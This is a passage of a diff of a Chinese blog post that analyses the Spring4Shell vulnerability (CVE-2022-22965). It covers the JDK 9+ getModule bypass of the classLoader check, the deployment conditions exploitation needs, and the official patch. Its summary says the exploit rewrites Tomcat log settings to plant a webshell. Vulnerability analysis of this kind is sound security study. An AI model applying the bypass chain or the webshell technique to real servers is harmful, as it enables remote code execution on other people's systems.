to those</span></div><div class="line">					<span class="keyword">continue</span>;</div><div class="line">				&#125;</div><div class="line">				<span class="keyword">if</span> (logger.isTraceEnabled()) &#123;</div><div class="line">				...</div></pre></td></tr></table></figure>
 <p>注意到条件<code>if (Class.class == beanClass &amp;&amp; (&quot;classLoader&quot;.equals(pd.getName()) || &quot;protectionDomain&quot;.equals(pd.getName())))</code>，该条件的意思是，如果当前的对象的类为<code>Class.class</code>（即<code>java.lang.Class</code>），并且下一个要解析的属性名为<code>classLoader</code>或<code>protectionDomain</code>，就直接contine，不会再解析该层。而在Spring4shell的绕过中，由于JDK 9+对模块化进行了支持，实现了getModule方法，从而可以通过该方法得到的Module进一步获取classLoader，而不是直接使用Class的getClaasLoader()去获取。</p>
 <p>具体来讲就是把</p>
@@ -370,28 +356,27 @@
 <p>替换成</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Xxx.getClass()</div><div class="line">    java.lang.Class.getModule()</div><div class="line">        java.lang.Module.getClassLoader()</div></pre></td></tr></table></figure>
 <p>从而绕过该补丁。</p>
-<h2 id="可利用程度">可利用程度</h2>
-<p>首先，我们假设受害者已满足JDK 9+，并且使用了Spring bean，此外还有一个不是很容易满足的条件：</p>
+<h2 id="可利用程度"><a href="#可利用程度" class="headerlink" title="可利用程度"></a>可利用程度</h2><p>首先，我们假设受害者已满足JDK 9+，并且使用了Spring bean，此外还有一个不是很容易满足的条件：</p>
 <ul>
 <li><strong>Web应用部署方式必须为Tomcat war包部署（jar的形式则不行</strong>）</li>
 </ul>
 <p>然后，攻击者需要知道<strong>存在漏洞的url路由</strong>，这和应用的业务息息相关。</p>
 <p>所以该漏洞虽然是核弹级，但要在真实情况下找到满足这些条件的情形还是比较少的。这也许能解释为什么漏洞爆出后，在野利用的反响远远不如Log4shell那么大。</p>
-<h2 id="总结">总结</h2>
-<ul>
-<li>该漏洞是在spring bean解析参数绑定时，对对象的class属性进行了赋值造成</li>
+<h2 id="官方补丁"><a href="#官方补丁" class="headerlink" title="官方补丁"></a>官方补丁</h2><p>官方的补丁为：<a href="https://github.com/spring-projects/spring-framework/commit/002546b3e4b8d791ea6acccb81eb3168f51abb15" target="_blank" rel="external">https://github.com/spring-projects/spring-framework/commit/002546b3e4b8d791ea6acccb81eb3168f51abb15</a>，具体来说，修复后的程序仅允许对属性描述符为name或以Name结尾的属性进行赋值，从而防止classLoader和Module以及之后的属性被赋值。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
+<li>该漏洞是在spring bean解析参数绑定时，对对象属性进行赋值时没有对classLoader进行限制造成。</li>
+<li>开发者要实现的功能：支持参数绑定时向对象的属性进行赋值操作。漏洞出现的原因：能对classLoader之后的其他属性进行赋值，从而修改了一些重要的全局变量导致getshell（比如这里修改了日志文件的文件名、内容，导致写入webshell）。</li>
 <li>该洞的利用过程是查找一系列的getXXX链，然后可以设置其值为任意字符串，exp中通过设置tomcat日志相关属性以写入webshell。这个链的查找过程应该是很有难度的，除了写日志这条链，还可以尝试去发现其他的利用链，但过程应该很难。</li>
 <li>该漏洞与原型链污染有相似的地方（污染现有对象的属性达到利用），与python模板注入也有相似的地方（通过链式的形式在对象成员属性或继承链之间跨越，以达到能够利用的属性处）。</li>
 </ul>
-<h2 id="参考资料">参考资料</h2>
-<ul>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
 <li>p1n93r师傅的pdf</li>
 <li><a href="https://paper.seebug.org/1877/" target="_blank" rel="external">Spring 远程命令执行漏洞（CVE-2022-22965）原理分析和思考</a></li>
 <li><a href="https://github.com/reznok/Spring4Shell-POC" target="_blank" rel="external">Spring4Shell PoC Application</a></li>
 <li><a href="https://tomcat.apache.org/tomcat-8.0-doc/config/valve.html#Access_Log_Valve" target="_blank" rel="external">Access Log Valve</a></li>
 <li><a href="https://xz.aliyun.com/t/11143" target="_blank" rel="external">CVE-2022-22965: Spring Framework RCE via Data Binding on JDK 9+ 分析</a></li>
 <li><a href="https://cloud.tencent.com/developer/article/1035297" target="_blank" rel="external">Struts2 S2-020在Tomcat 8下的命令执行分析</a></li>
-<li><a href="https://hengyunabc.github.io/spring-boot-application-start-analysis/" target="_blank" rel="external">spring boot应用启动原理分析</a></li>
+<li><a href="https://hengyunabc.github.io/spring-boot-application-start-analysis/" target="_blank" rel="external">spring boot应用启动原理分析 </a></li>
 </ul>
 
         
@@ -690,7 +675,7 @@
         <footer id="footer">
     <div class="outer">
         <div id="footer-info" class="inner">
-            &copy; 2022 HACHp1<br>
+            &copy; 2023 HACHp1<br>
             Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>. Theme by <a href="http://github.com/ppoffice">PPOffice</a>
         </div>
     </div>
